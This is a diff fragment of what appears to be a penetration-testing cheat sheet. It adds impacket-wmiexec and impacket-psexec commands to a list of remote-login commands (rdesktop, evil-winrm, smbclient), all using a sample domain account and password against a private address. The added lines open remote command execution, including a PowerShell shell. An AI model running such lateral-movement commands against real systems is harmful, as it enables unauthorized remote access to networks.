@@ -213,6 +213,8 @@ https://github.com/swisskyrepo/PayloadsAllTheThings
     rdesktop -u Tim 192.168.100.100
     evil-winrm -u Tim -p Mdp123 -i 192.168.100.100
     impacket-smbclient DOMAINE/Tim:'Mdp123'@192.168.100.100
+    impacket-wmiexec DOMAINE/Tim:Mdp123@192.168.100.100
+    impacket-psexec DOMAINE/Tim:Mdp123@192.168.100.100 powershell.exe
     
 **CrackMapExec**
 
